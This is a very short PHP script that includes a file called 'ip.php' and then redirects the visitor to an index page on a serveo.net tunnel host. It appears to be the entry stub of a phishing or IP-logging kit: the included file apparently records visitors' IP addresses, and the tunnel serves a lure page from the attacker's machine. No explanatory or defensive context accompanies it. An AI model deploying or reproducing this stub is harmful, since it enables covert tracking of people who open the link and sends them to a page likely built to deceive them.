<?php
include 'ip.php';
header('Location: https://linkduit.serveo.net/index.html');
exit
?>
